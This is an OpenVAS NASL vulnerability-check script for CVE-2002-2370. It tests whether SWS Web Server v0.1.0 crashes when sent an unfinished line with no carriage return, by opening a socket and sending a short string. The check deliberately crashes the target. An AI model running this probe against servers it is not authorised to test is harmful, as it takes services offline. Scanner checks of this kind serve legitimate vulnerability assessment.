# OpenVAS Vulnerability Test
# $Id: SWS_DoS.nasl 14336 2019-03-19 14:53:10Z mmartin $
# Description: HTTP unfinished line denial
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
# Modifications by rd:
# - Removed the numerous (and slow) calls to send() and recv()
#   because the original exploit states that sending just one
#   request will crash the server
#
# Copyright:
# Copyright (C) 2002 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

# References:
#
# Message-Id: <200209021802.g82I2Vd48012@mailserver4.hushmail.com>
# Date: Mon, 2 Sep 2002 11:02:31 -0700
# To: vulnwatch@vulnwatch.org
# From: saman@hush.com
# Subject: [VulnWatch] SWS Web Server v0.1.0 Exploit
#
# Vulnerables:
# SWS Web Server v0.1.0

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11171");
  script_version("$Revision: 14336 $");
  script_tag(name:"last_modification", value:"$Date: 2019-03-19 15:53:10 +0100 (Tue, 19 Mar 2019) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_cve_id("CVE-2002-2370");
  script_bugtraq_id(5664);
  script_name("HTTP unfinished line denial");



  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");

  script_copyright("This script is Copyright (C) 2002 Michel Arboi");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl", "httpver.nasl");
  script_require_ports("Services/www", 80);
  script_tag(name:"solution", value:"Upgrade your web server");
  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"summary", value:"We could crash the remote web server by sending an unfinished line.
  (ie: (OpenVAS) without a return carriage at the end of the line). A cracker may exploit this flaw to
  disable this service.");

  exit(0);
}

#
include("http_func.inc");

port = get_http_port(default:80);

if (!get_port_state(port)) exit(0);

if(http_is_dead(port:port))exit(0);
soc = http_open_socket(port);
if (!soc) exit(0);
send(socket:soc, data:"|OpenVAS|");
http_close_socket(soc);
if(http_is_dead(port:port, retry:3))security_message(port);
